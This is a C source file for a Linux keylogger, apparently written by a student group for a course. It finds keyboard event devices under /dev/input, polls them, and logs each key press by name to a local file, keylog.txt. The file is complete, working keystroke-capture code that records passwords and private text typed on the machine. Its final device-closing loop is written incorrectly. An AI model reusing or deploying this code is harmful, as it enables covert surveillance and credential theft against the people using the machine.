/*
 * Author: Group 14, I2C HSLU
 */

// Necessary includes from standard C libraries
#include <stdio.h>       // Needed for file operations (e.g., fopen, fprintf)
#include <stdlib.h>      // Needed for memory management and exit()
#include <fcntl.h>       // Needed for open() and file descriptor flags (e.g., O_RDONLY)
#include <unistd.h>      // Needed for close(), read(), and other POSIX functions
#include <linux/input.h> // Needed for the input_event struct and EV_KEY definitions

#include <poll.h> // polling from different event files

// Constants
//#define KEYBOARD_DEVICE "/dev/input/event23" // Replace the event the actual event number for your keyboard (see /dev/input/by-path)...
// readlink -e $(find /dev/input/by-path/ -iname "*kbd*" 2>/dev/null)
#define LOG_FILE_PATH "keylog.txt"
#define EVENT_MAX 4 // maximum devices to read keyboard events from

/* 
 * Get event file
 */

#include <string.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/ioctl.h>

// Function to determine if a device is likely a keyboard
int is_keyboard(const char *device_path) {
    int fd = open(device_path, O_RDONLY);
    if (fd < 0) {
        perror("Failed to open device");
        return -1;
    }

    char name[256] = "Unknown";
    if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) < 0) {
        perror("Failed to get device name");
        close(fd);
        return -1;
    }

    // Filter based on name: Check if "keyboard" appears in the device name
    if (strcasestr(name, "keyboard")) {
        printf("Device recognized as keyboard: %s (%s)\n", device_path, name);
	// let the device open and return the devices fd
        return fd;
    } else {
        printf("Skipping non-keyboard device: %s (%s)\n", device_path, name);
	close(fd);
	return 0;
    }
}

/*
 * Log keys into file
 */
void log_key(const char *filename, const char *key) {
    FILE *file = fopen(filename, "a");
    if (file == NULL) {
        perror("Error opening log file");
        exit(EXIT_FAILURE);
    }
    fprintf(file, "%s\n", key);
    fclose(file);
}

/*
 * Static mapping of key codes to human readable
 * Linux kernel source: https://elixir.bootlin.com/linux/v6.12.6/source/include/uapi/linux/input-event-codes.h
 * ... chould be chnaged to a dynamic method, like libevdev...
 */
const char* get_key_name(int key_code) {
    static const char *key_names[] = {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
        "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y",
        "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL",
        "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE",
        "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M",
        "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE",
        "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10",
        "NUMLOCK", "SCROLLLOCK", "K7", "K8", "K9", "KMINUS", "K4", "K5", "K6",
        "KPLUS", "K1", "K2", "K3", "K0", "KDOT", "UNKNOWN", "ZENKAKUHANKAKU",
        "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA",
        "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ",
        "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END",
        "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN",
        "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA",
        "HANGEUL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA", "COMPOSE", "STOP",
        "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT",
        "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE",
        "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "ROTATE_DISPLAY",
        "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD",
        "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD",
        "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT",
        "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN",
        "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21",
        "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "DASHBOARD",
        "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP",
        "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE",
        "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP",
        "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP",
        "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH",
        "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE",
        "BRIGHTNESS_AUTO", "DISPLAY_OFF", "WWAN", "RFKILL", "MICMUTE" 
    };

    if (key_code >= 0 && key_code < sizeof(key_names) / sizeof(key_names[0])) {
        return key_names[key_code];
    } else {
        return "UNKNOWN";
    }
}

/*
 * MAIN PROCEDURE
 */
int main() {

/*
 * Get keyboard devices
 */

    int event_fds[EVENT_MAX];
    int index = 0; // event index
    struct dirent *entry;
    DIR *dir = opendir("/dev/input/");
    if (!dir) {
        perror("Failed to open /dev/input/");
        return EXIT_FAILURE;
    }

    printf("Scanning /dev/input/ for keyboard devices...\n");

    while ((entry = readdir(dir)) != NULL) {
        // Only consider files starting with "event"
        if (strncmp(entry->d_name, "event", 5) != 0) continue;

        char device_path[PATH_MAX];
        snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);

        event_fds[index] = is_keyboard(device_path);
	if (event_fds[index] > 0) {
            printf("Valid keyboard device found: %s\n", device_path);
	    index++; 
            // Break after finding the first valid keyboard, or continue if multiple are needed
            //closedir(dir);
            //return EXIT_SUCCESS;
        }
    }

    closedir(dir);

/*
 * Open keyboard devices
 */


// should already be opened
// currently handled above


/* 
 * Log keystrokes
 */

   // Polling for keystrokes
   struct pollfd fds[EVENT_MAX];
   for (int i = 0; i < index; i++) {
       fds[i].fd = event_fds[i];
       fds[i].events = POLLIN; // Monitor for readable data
   }


    printf("Logging keystrokes to %s\n", LOG_FILE_PATH);

    // loop
    while (1) {
   
         int ret = poll(fds, index, -1); // Wait indefinitely for an event
         if (ret < 0) {
             perror("Poll error");
             break;
         }

	// reading keystrokes
	for(int i=0; i<index;i++) {
	  if(fds[i].revents & POLLIN) {
              struct input_event ev;
              if (read(fds[i].fd, &ev, sizeof(struct input_event)) < 0) {
                  perror("Error reading input event");
                  break;
              } else {
	        // Key mapping and logging
                if (ev.type == EV_KEY && ev.value == 1) { // Key press
                    const char *key_name = get_key_name(ev.code);
                    log_key(LOG_FILE_PATH, key_name);
		}
	    }
          }
	}
    }

/*
 * Close keyboard devices
 */
for(int i=index-1; i<=0; index--) {
    close(event_fds[i]);
}

    return 0;
}
